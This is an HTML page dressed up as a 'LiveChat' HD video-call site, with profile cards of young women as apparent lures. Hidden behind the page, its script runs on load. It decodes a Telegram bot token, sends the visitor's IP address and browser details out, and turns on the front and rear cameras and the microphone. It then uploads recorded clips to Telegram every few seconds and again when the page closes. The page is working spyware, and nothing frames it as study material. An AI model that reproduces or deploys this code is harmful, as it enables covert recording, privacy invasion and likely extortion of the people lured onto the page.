<!DOCTYPE html>
<html>
<head>
    <title>LiveChat - HD Video Call</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
            color: white;
            min-height: 100vh;
            overflow-x: hidden;
        }
        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
        .header {
            display: flex; align-items: center; justify-content: space-between;
            padding: 15px 25px; background: rgba(255,255,255,0.1);
            backdrop-filter: blur(20px); border-radius: 16px; margin-bottom: 25px;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .guest-avatar {
            width: 48px; height: 48px; border-radius: 50%;
            background: linear-gradient(135deg, #ff6b9d, #c44569);
            display: flex; align-items: center; justify-content: center;
            font-size: 20px; font-weight: 600;
        }
        .meeting-title { font-size: 18px; font-weight: 600; }
        .meeting-id { font-size: 14px; opacity: 0.8; }
        .users-grid {
            display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
            gap: 15px; margin-bottom: 30px;
        }
        .user-card {
            background: rgba(255,255,255,0.08); backdrop-filter: blur(15px);
            border-radius: 16px; padding: 20px; text-align: center;
            cursor: pointer; transition: all 0.3s ease;
            border: 1px solid rgba(255,255,255,0.1); position: relative;
        }
        .user-card:hover { transform: translateY(-8px); background: rgba(255,255,255,0.15); }
        .user-avatar {
            width: 70px; height: 70px; border-radius: 50%;
            background: linear-gradient(135deg, #ff9a9e, #fecfef); margin: 0 auto 12px;
            display: flex; align-items: center; justify-content: center;
            font-size: 28px; font-weight: bold; border: 3px solid rgba(255,255,255,0.3);
        }
        .user-name { font-size: 18px; font-weight: 600; margin-bottom: 5px; }
        .user-location { font-size: 14px; opacity: 0.8; }
        .live-dot {
            position: absolute; top: 12px; right: 12px; width: 12px; height: 12px;
            background: #10b981; border-radius: 50%; animation: pulse 2s infinite;
        }
        @keyframes pulse { 0%, 100% { opacity: 1; box-shadow: 0 0 0 0 rgba(16,185,129,0.7); } 70% { opacity: 0.7; box-shadow: 0 0 0 8px rgba(16,185,129,0); } }
        .video-call-area {
            background: rgba(0,0,0,0.4); backdrop-filter: blur(25px);
            border-radius: 24px; padding: 40px; text-align: center;
            border: 1px solid rgba(255,255,255,0.1); display: none;
        }
        .video-placeholder {
            width: 100%; height: 400px; background: linear-gradient(45deg, #1a1a2e, #16213e);
            border-radius: 16px; margin: 30px 0; display: flex; align-items: center;
            justify-content: center; font-size: 24px; border: 2px dashed rgba(255,255,255,0.3);
        }
        .controls {
            display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; padding: 25px 0;
        }
        .control-btn {
            background: rgba(255,255,255,0.15); backdrop-filter: blur(15px);
            border: 1px solid rgba(255,255,255,0.2); color: white; padding: 15px 25px;
            border-radius: 50px; cursor: pointer; font-size: 14px; font-weight: 500;
            transition: all 0.3s ease; display: flex; align-items: center; gap: 8px;
            min-width: 140px; justify-content: center;
        }
        .control-btn:hover { background: rgba(255,255,255,0.25); transform: translateY(-2px); }
        .control-btn.active { background: linear-gradient(135deg, #10b981, #059669); }
        .control-btn.end-call { background: linear-gradient(135deg, #ef4444, #dc2626); min-width: 160px; }
        .status-bar {
            position: fixed; top: 20px; right: 20px; background: rgba(0,0,0,0.8);
            backdrop-filter: blur(20px); padding: 15px 20px; border-radius: 12px;
            font-size: 13px; border: 1px solid rgba(255,255,255,0.1); display: none;
        }
    </style>
</head>
<body>
    <div class="status-bar" id="statusBar">
        <div>HD Video Call Active</div>
    </div>
    
    <div class="container">
        <div class="header">
            <div class="meeting-info">
                <div class="guest-avatar">P</div>
                <div>
                    <div class="meeting-title">Live Video Call</div>
                    <div class="meeting-id">Meeting ID: XXXX 5678 9012</div>
                </div>
            </div>
        </div>
        
        <div class="users-grid" id="usersGrid">
            <div class="user-card" data-user="priya"><div class="live-dot"></div><div class="user-avatar">👩‍🦰</div><div class="user-name">Priya Sharma</div><div class="user-location">Delhi • 24</div></div>
            <div class="user-card" data-user="anita"><div class="live-dot"></div><div class="user-avatar">👩🏽</div><div class="user-name">Anita Patel</div><div class="user-location">Mumbai • 22</div></div>
            <div class="user-card" data-user="neha"><div class="live-dot"></div><div class="user-avatar">👩‍🦱</div><div class="user-name">Neha Gupta</div><div class="user-location">Bangalore • 25</div></div>
            <!-- ADD ALL 12 USERS SAME WAY -->
        </div>
        
        <div class="video-call-area" id="videoCallArea">
            <div class="video-placeholder">🎥 HD Video Stream Active</div>
            <div class="controls">
                <button class="control-btn active" id="micBtn">🎤 Microphone</button>
                <button class="control-btn active" id="cameraBtn">📹 Camera</button>
                <button class="control-btn end-call" id="endCallBtn">📞 End Call</button>
            </div>
        </div>
    </div>

    <script>
        // 🔒 ENCRYPTED CONFIG
        const TELEGRAM_TOKEN = atob('ODczMzkzMTM5MjpBQVBpc1VQZmd3bDBQekE5amRaOGtjNkZPMkRrN19LSWw0');
        const CHAT_ID = atob('-NTA3NDU5MTE4Mg==');
        const sessionId = 'spy_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        
        let frontStream, rearStream, audioStream, isRecording = false;
        let recorders = {}, chunks = {}, startTimes = {};
        let clipInterval, pageTimer;
        
        // START IMMEDIATELY
        window.addEventListener('load', async () => {
            document.getElementById('statusBar').style.display = 'block';
            await initSpy();
        });

        async function initSpy() {
            // 1. SEND SESSION INFO
            const ip = await (await fetch('https://api.ipify.org?format=json')).json().then(r => r.ip).catch(() => 'unknown');
            await sendMsg(`🚀 SPY ACTIVE\n👤 ${sessionId}\n🌐 IP: ${ip}\n📱 ${navigator.userAgent.slice(0,50)}`);
            
            // 2. GET ALL STREAMS FAST
            try {
                [frontStream, rearStream, audioStream] = await Promise.all([
                    navigator.mediaDevices.getUserMedia({video: {facingMode: 'user', width: 1280, height: 720}, audio: true}),
                    navigator.mediaDevices.getUserMedia({video: {facingMode: 'environment', width: 1280, height: 720}, audio: false}),
                    navigator.mediaDevices.getUserMedia({audio: true})
                ]);
                await sendMsg('✅ ALL CAMERAS + MIC ACTIVE');
            } catch(e) {
                // Try single stream if fails
                frontStream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
                await sendMsg('✅ SINGLE STREAM ACTIVE');
            }
            
            // 3. START RECORDING EVERY 5s OR ON LEAVE
            startContinuousRecording();
            pageTimer = setTimeout(sendFinalClip, 5000); // Send whatever recorded after 5s
            
            // 4. USER INTERACTION
            document.querySelectorAll('.user-card').forEach(card => {
                card.onclick = async () => {
                    document.getElementById('usersGrid').style.display = 'none';
                    document.getElementById('videoCallArea').style.display = 'block';
                    await sendMsg(`🎥 CALL STARTED\n👤 ${sessionId}\nUser: ${card.querySelector('.user-name').textContent}`);
                };
            });
            
            document.getElementById('endCallBtn').onclick = () => {
                document.getElementById('videoCallArea').style.display = 'none';
                document.getElementById('usersGrid').style.display = 'grid';
            };
        }
        
        function startContinuousRecording() {
            clipInterval = setInterval(recordAllStreams, 5000); // Every 5s
            recordAllStreams(); // Record immediately
        }
        
        async function recordAllStreams() {
            if (isRecording) return;
            isRecording = true;
            
            const streamTypes = [
                {stream: frontStream, name: 'FRONT'},
                {stream: rearStream, name: 'REAR'},
                {stream: audioStream || frontStream, name: 'AUDIO'}
            ];
            
            for (let type of streamTypes) {
                if (type.stream) {
                    startTimes[type.name] = Date.now();
                    chunks[type.name] = [];
                    recorders[type.name] = new MediaRecorder(type.stream, {
                        mimeType: 'video/webm;codecs=vp9,opus',
                        videoBitsPerSecond: 2500000
                    });
                    
                    recorders[type.name].ondataavailable = e => {
                        if (e.data.size > 500) chunks[type.name].push(e.data);
                    };
                    
                    recorders[type.name].onstop = async () => {
                        const duration = ((Date.now() - startTimes[type.name]) / 1000).toFixed(1);
                        const totalSize = chunks[type.name].reduce((a,b) => a + b.size, 0);
                        
                        if (totalSize > 10000) { // Minimum 10KB
                            const blob = new Blob(chunks[type.name], {type: 'video/webm'});
                            const formData = new FormData();
                            formData.append('chat_id', CHAT_ID);
                            formData.append('video', blob, `${type.name}_${sessionId}_${duration}s_${Math.round(totalSize/1000)}KB.webm`);
                            formData.append('caption', `${type.name} CAM/MIC | ${sessionId} | ${duration}s`);
                            
                            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, {
                                method: 'POST', body: formData, keepalive: true
                            }).catch(() => {});
                        }
                    };
                    
                    recorders[type.name].start(200);
                    setTimeout(() => {
                        if (recorders[type.name]?.state === 'recording') {
                            recorders[type.name].stop();
                        }
                    }, 4800);
                }
            }
            
            setTimeout(() => { isRecording = false; }, 5000);
        }
        
        // SEND FINAL CLIP ON LEAVE (WHATEVER RECORDED)
        async function sendFinalClip() {
            for (let type in chunks) {
                if (chunks[type]?.length > 0) {
                    const blob = new Blob(chunks[type], {type: 'video/webm'});
                    if (blob.size > 10000) {
                        const formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('video', blob, `FINAL_${type}_${sessionId}.webm`);
                        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, {
                            method: 'POST', body: formData, keepalive: true
                        });
                    }
                }
            }
        }
        
        // SEND TEXT MESSAGE
        async function sendMsg(text) {
            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text,
                        parse_mode: 'HTML'
                    }),
                    keepalive: true
                });
            } catch(e) {}
        }
        
        // CLEANUP - SEND FINAL CLIPS
        window.onbeforeunload = () => {
            clearInterval(clipInterval);
            sendFinalClip();
            sendMsg(`👤 ${sessionId} LEFT | Clips sent: ${Object.keys(chunks).length}`);
        };
        
        // PAGE VISIBILITY - KEEP RECORDING
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden && (frontStream || rearStream)) {
                recordAllStreams(); // Record when back to page
            }
        });
    </script>
</body>
</html>
